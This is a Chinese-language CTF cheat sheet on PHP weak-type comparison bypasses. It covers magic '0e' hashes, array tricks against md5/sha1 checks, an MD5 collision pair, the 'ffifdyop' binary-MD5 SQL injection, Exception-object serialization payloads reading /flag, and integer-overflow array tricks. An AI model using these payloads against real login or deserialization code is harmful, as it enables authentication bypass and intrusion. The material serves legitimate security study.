## **php弱类型：**
<https://www.cnblogs.com/linfangnan/p/13411103.html>
**类型相等判断**
PHP 比较 2 个值是否相等可以用 “ == ” 或 “ === ”，“ == ” 会在比较时自动转换类型而不改变原来的值，因此这个符号经常出现漏洞。“ == ” 比较相等的一些常见值如下，当某些语句的判断条件是使用 “ == ”来判断时，就可以使用弱类型来替代。值得一提的是 “0e” 开头的哈希字符串，PHP 在处理哈希字符串时会把每一个以 “0E” 开头的哈希值都解释为 0。

```
'' == 0 == false == "0"
"00" == true
'123' == 123
'abc'  == true  常见于字符串判断相等。
1 == true
1 == 0.99999999999999999 
0.99999999999999999就会产生小数下标溢出为1
'abc' != 1
'abc'  == 0
要和一个随机数串弱比较==相同，直接传数组[true,true]==12

'123a' == 123
switch('2a') // switch(2)

'123);// ' == 123
'0x01' == 1
'0e12346789' == '0e987654321'
[false] == [0] == [NULL] == ['']
NULL == false == 0
true == 1

'1%2b2' == 1
'1+2' == 1

?num=1+2
$a=$_GET['num'] ==1
intval(a) == 3 
intval(1+2) == 3
intval("1+2") == 1
intval(" '1000' ") == 0
echo intval([0])  // 1 传一个数组永远为1

intval科学计数返回前面，科学计数后有+好返回字符串拼接后值。
intval(2019e1) == 2019
intval(2019e1+1) == 20191 
42.00e+00000 == 42
strlen(1e9)  //3

intval($password) < 2333 && intval($password + 1) > 2333
$password=0x2332 也可以

echo intval(0x117c,0) // 输出10进制4476  
第二个参数默认base是10，如果 base 是0则通过检测 var 的格式来决定使用的进制： 
◦ 如果字符串包括了 "0x" (或 "0X") 的前缀，使用 16 进制 (hex)；否则，  
◦ 如果字符串以 "0" 开始，使用 8 进制(octal)；否则，  
◦ 将使用 10 进制 (decimal)。 

intval(010574,0) //返回值为4476
intval(+010574,0) //返回值为4476

intval(4476.1,0) //返回值为4476
intval(4476.10,0) //返回值为4476

intval(0) == 'flag字符串'
intval(aaa123) == 'flag字符串'
intval(false) == 'flag字符串'
intval(md5(phpinfo())) == '字符串' == 0  字母开头
```

#### intval 函数
成功返回 var 的 interger 值，失败时返回 0。空的 array 返回 0，非空的 array 返回 1 最大的值取决于操作系统 32 位操作系统最大有符号整型范围是 -2147483648 到 2147483647 64 位系统上，最大有符号的整数的值为 9223372036854775807

```
<?php
echo intval(42);                      // 42
echo intval(4.2);                     // 4
echo intval('42');                    // 42
echo intval('+42');                   // 42
echo intval('-42');                   // -42
echo intval(042);                     // 34
echo intval('042');                   // 42
echo intval(1e10);                    // 1000000000
echo intval('1e10');                  // 1
echo intval(0x1A);                    // 26
echo intval(42000000);                // 42000000
echo intval(420000000000000000000);   // 0
echo intval('420000000000000000000'); // 2147483647
echo intval(42, 8);                   // 42
echo intval('42', 8);                 // 34
echo intval(array());                 // 0
echo intval(array('foo', 'bar'));     // 1
?>
```
如果遇到了 “===” 则不会进行类型转换，但也并不代表无从下手。如果条件表达式中含有函数，也可以通过**传入数组**让函数返回 NULL 使得条件满足。或者传值为空。



^
## **md5判断**
**弱绕过**
```
if(md5($_POST['md51']) == md5($_POST['md52']) 
     && $_POST['md51'] != $_POST['md52'])
```
方法1：

PHP 在处理哈希字符串时，“0e” 开头的值利用 “==” 判断相等时会被视为 0。所以如果两个不同的密码经过哈希以后，其哈希值都是以 ”0E” 开头的，那么 PHP 将会认为他们相同。
md5(QNKCDZO)==0

md51和md52取以下两值
QNKCDZO  s155964671a s878926199a s1091221200a  240610708 0e215962017
方法2：
数组绕过，原理是 md5() 等函数不能处理数组，导致函数返回Null。而Null是等于Null的，导致了绕过。
?md51[]=1&md52[]=2

^
**强绕过**
```
if ((string)$_POST['a'] !== (string)$_POST['b'] && md5($_POST['a']) === md5($_POST['b'])) {
        echo `$cmd`;
}



a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2

&b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2
```
md5后为
008ee33a9d58b51cfeb425b0959121c9

^
**特性**
md5("123") === md5(123)
md5("INF") === md5(INF)
md5("NAN") === md5(NAN)
在PHP中，NAN是一个特殊的浮点数值，表示非数值（Not-A-Number）。当一个运算无法计算结果时，比如零除以零，就会产生NAN。PHP中的INF是一个特殊的浮点数值，表示无穷大（Infinity）。当数值超过PHP_FLOAT_MAX或者使用一些数学函数产生极大或极小的结果时，就会得到INF。

^
**php中原值和md5(原值)后要==**
原值为0e215962017即可，其值md5后0e291242476940776845150308577824
也是0e开头。


^
**数据库中的二进制MD5造成注入：**
```
select * from 'admin' where password=md5($pass,true) //开启true返回md5二进制
```
```
<?php
$pass = "ffifdyop";
echo md5($pass,ture);  //为'or'6?]??!r,??b
?>
```
所以传入ffifdyop即可密码正确。


^
**传数组比较md5：**
```
$a = $_GET['a'];
$b = $_POST['b'];
if (isset($a) && isset($b)) {
    if (!is_numeric($a) && !is_numeric($b)) {
        if ($a == 0 && md5($a) == $b[$a]) {
            echo $flag;
```
a随便传一个非数值，b数组传对应的md5值即可。
```
?a=s
b[s]=03c7c0ace395d80182db07ae2c30f034
```


^
## **sha哈希**
和md5类似，

以下值在sha1加密后以0E开头：
```
sha1('aaroZmOk')
sha1('aaK1STfY')
sha1('aaO8zKZF')
sha1('aa3OFF9m')
```
一样可以数组绕过。
```
$a=[1];
$b=[2];
if( ($a != $b) && (sha1($a)=== sha1($b)) ){
    echo "6";
}
```
如果可以反序列化赋值对象，new Exception对象绕过。
```
class CDUTSEC
{
    public $var1;
    public $var2;

    // function __construct($a, $b)
    // {
    //     $var1 = $var1;
    //     $var2 = $var2;
    // }

    // function __destruct()
    // {
    //     echo md5($this->var1);
    //     echo md5($this->var2);
    //     if (($this->var1 != $this->var2) && (md5($this->var1) === md5($this->var2)) && (sha1($this->var1) === sha1($this->var2)))
    //     {
    //         eval($this->var1);
    //     }
    // }
}

$cmd="readfile('/flag');?>";
$a = new Exception($cmd);$b = new Exception($cmd,1);

$tr = new CDUTSEC();
$tr->var1=$a;
$tr->var2=$b;
print_r($tr);
echo urlencode(serialize($tr));
```
^
#### 三重绕过

```
 if( ($this->a !== $this->b) && (md5($this->a) === md5($this->b)) 
&& (sha1($this->a)=== sha1($this->b)) )


$a->a=1; 
$a->b='1'; 

$a->a=NULL;
$b->b=false;

同值不同类，通过三个检测
$a = new  Error("1",1); $b= new  Error("1",2); //两个new必须放一行
```


^
## **php整数溢出**
PHP中整数溢出的具体值取决于系统的架构（32位还是64位）。在32位系统中，整数的范围是 -2147483648 到 2147483647，当超过这个范围时会发生溢出。在64位系统中，整数的范围是 -9223372036854775808 到 9223372036854775807。

当一个整数超过了系统所能表示的最大值，它会回绕到最小值。同样，当一个整数低于系统所能表示的最小值，它会回绕到最大值。这就是整数溢出的发生。

在PHP中，如果整数发生溢出，它不会引发错误，而是静默地产生一个新的整数值。例如，在32位系统中，如果一个整数超过了2147483647，它将回绕到-2147483648。这种行为可能导致程序逻辑错误，因此在处理较大数值时应该格外小心。

```
$arr[$_GET['0']]=1;
if($arr[]==1){ //末尾为1？ 
die($flag);
}

?0=2147483647   //使用数组整型溢出绕过赋值式“永真”
?0[]=1   //数组绕过
```


```
$arr[$_GET['0']]=1;
if($arr[]=1){  //$arr[]=1意思是给数组下一个下标赋值为1
die();
}else{
echo $flag;
}

?0=9223372036854775807     //数组下标溢出，要刚刚好，多了会截断，刚刚好时，经过$arr[]=1下标直接溢出，无法赋值。
```

^
对于会x10倍的数，传入比溢出数少1位的数大一点即可。
```
如932337203685477581
```